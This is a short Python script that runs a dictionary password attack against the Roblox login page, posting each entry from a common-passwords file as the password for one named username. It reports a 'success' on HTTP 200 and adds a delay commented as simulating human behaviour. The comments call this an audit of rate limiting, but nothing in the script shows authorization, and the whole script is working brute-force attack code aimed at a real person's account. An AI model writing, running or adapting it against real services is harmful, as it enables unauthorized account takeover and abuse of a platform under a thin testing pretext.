import requests
import time
from requests.exceptions import RequestException

# Configuration
TARGET_URL = "https://roblox.com/login"
USERNAME = "nono819819"
PASSWORD_FILE = "common-passwords.txt"
COOLDOWN_SECONDS = 0.1  # Simulating human delay

def test_rate_limiting():
    try:
        with open(PASSWORD_FILE, 'r') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"[!] Error: {PASSWORD_FILE} not found.")
        return

    print(f"[*] Starting audit on {TARGET_URL}...")

    for password in passwords:
        payload = {
            "username": USERNAME,
            "password": password
        }

        try:
            # Sending the POST request
            response = requests.post(TARGET_URL, data=payload, timeout=5)
            
            # Logic to detect success vs failure
            # Most systems use 200 OK for success and 401 Unauthorized for failure
            if response.status_code == 200:
                print(f"[+] Success found: {password}")
                break
            elif response.status_code == 429:
                print(f"[!] Rate limit triggered (HTTP 429). Audit successful.")
                break
            else:
                print(f"[-] Attempt failed for: {password} (Status: {response.status_code})")

        except RequestException as e:
            print(f"[!] Network error: {e}")
            continue

        # Cool down timer to simulate human behavior
        time.sleep(COOLDOWN_SECONDS)

if __name__ == "__main__":
    test_rate_limiting()